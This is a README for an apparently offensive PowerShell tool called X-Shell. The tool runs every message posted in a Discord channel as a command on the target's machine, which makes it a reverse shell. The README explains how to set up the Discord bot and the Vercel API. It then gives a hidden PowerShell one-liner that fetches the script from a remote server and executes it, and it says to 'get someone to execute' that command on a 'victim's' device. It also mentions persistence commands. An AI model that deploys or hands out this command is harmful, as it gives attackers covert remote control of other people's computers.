![](.src/banner.png)
# X-Shell

### This is a simple powershell script that establishes a connection to a Discord server using a Bot to listen on a specified channel. All messages from that channel will be executed on the machine (reverse Shell). I also added an API, which returns the script when provided with the correct Bearer Token, making it easy to deploy the Reverse Shell on the Victims Device.


## Usage

1. Use this template to create a Discord server https://discord.new/AFkzNqmAdmex
2. Write down the Ids of #chat, the Users category and the server
3. Create a discord bot https://discord.com/developers/applications, get its Id and add it to the server
4. Fork this repo, make it private and edit `index.js`:
   - Edit the token in line 27 to whatever you like
   - Adjust lines 32-35 to match your written down Ids and the Bot token
   - Create a Vercel account if you haven't already and deploy your private GitHub repo
5. Now that you've set up the API, simply get someone to execute this command, where you replace the vercel site with yours and the token following after "Bearer", with the one you set in step 4
   
```powershell -c "Start-Process -WindowStyle Hidden powershell -ArgumentList '-c iex ((irm -Uri ''https://xyz.vercel.app'' -Headers @{''Authorization''=''Bearer xxx''}))'"```

#### If you encounter any issues feel free to open an Issue

<hr>
If you wan the Remote connection to be persistent, you could run different commands, found in .src/commands.txt
<hr>
Even tho the API needs an authoriation Token, its still quite simple to fetch the powershell script and abuse the Discord Bot using the token. Ensure the api authorization token doesn't get wrong hands.
<hr>

## Disclaimer

This tool is for educational purposes only, and I do not assume any liability for any damages.
